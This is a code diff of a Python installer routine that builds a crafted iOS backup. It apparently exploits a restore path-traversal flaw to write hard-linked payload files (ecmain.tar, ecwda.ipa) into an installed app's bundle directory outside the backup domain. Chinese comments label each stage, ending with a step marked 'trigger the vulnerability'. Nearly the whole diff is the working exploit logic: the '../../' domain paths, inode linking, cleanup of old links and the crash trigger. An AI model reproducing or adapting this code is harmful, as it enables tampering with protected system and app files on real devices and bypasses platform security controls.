@@ -148,62 +148,53 @@ def perform_installation(serial: str = None) -> bool:
             backup.Directory("", "RootDomain"),
             backup.Directory("Library", "RootDomain"),
             backup.Directory("Library/Preferences", "RootDomain"),
+            # 1. 写入资源到暂存区 (RootDomain 为逻辑根)
             backup.ConcreteFile("Library/Preferences/temp", "RootDomain", owner=33, group=33, contents=helper_contents, inode=0),
+            backup.ConcreteFile("Library/Preferences/ecmain", "RootDomain", owner=33, group=33, contents=ecmain_contents, inode=1),
+            backup.ConcreteFile("Library/Preferences/ecwda", "RootDomain", owner=33, group=33, contents=ecwda_contents, inode=2),
+            
+            # 2. 准备目标应用目录
             backup.Directory(
                 "",
                 f"SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/{app_uuid}/{app}",
-                owner=33,
-                group=33,
+                owner=33, group=33,
             ),
+            
+            # 3. 建立硬链接映射 (通过 inode 关联)
             backup.ConcreteFile(
                 "",
                 f"SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/{app_uuid}/{app}/{app.split('.')[0]}",
-                owner=33,
-                group=33,
-                contents=b"",
-                inode=0,
+                owner=33, group=33, contents=b"", inode=0,
             ),
-            # Append ecmain.tar to the backup payload
-            backup.ConcreteFile("Library/Preferences/ecmain", "RootDomain", owner=33, group=33, contents=ecmain_contents, inode=1),
             backup.ConcreteFile(
                 "",
                 f"SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/{app_uuid}/{app}/ecmain.tar",
-                owner=33,
-                group=33,
-                contents=b"",
-                inode=1,
+                owner=33, group=33, contents=b"", inode=1,
             ),
-            # Append ecwda.ipa to the backup payload
-            backup.ConcreteFile("Library/Preferences/ecwda", "RootDomain", owner=33, group=33, contents=ecwda_contents, inode=2),
             backup.ConcreteFile(
                 "",
                 f"SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/{app_uuid}/{app}/ecwda.ipa",
-                owner=33,
-                group=33,
-                contents=b"",
-                inode=2,
+                owner=33, group=33, contents=b"", inode=2,
             ),
+
+            # 4. 关键清理：通过空内容覆盖 /var/.backup.i 下的旧链接，防止 File Exists 错误
             backup.ConcreteFile(
                 "",
                 "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp",
-                owner=501,
-                group=501,
-                contents=b"",
-            ),  # Break the hard link
+                owner=501, group=501, contents=b"",
+            ),
             backup.ConcreteFile(
                 "",
                 "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/ecmain",
-                owner=501,
-                group=501,
-                contents=b"",
-            ),  # Break the hard link
+                owner=501, group=501, contents=b"",
+            ),
             backup.ConcreteFile(
                 "",
                 "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/ecwda",
-                owner=501,
-                group=501,
-                contents=b"",
-            ),  # Break the hard link
+                owner=501, group=501, contents=b"",
+            ),
+
+            # 5. 触发漏洞
             backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b""),
         ]
     )
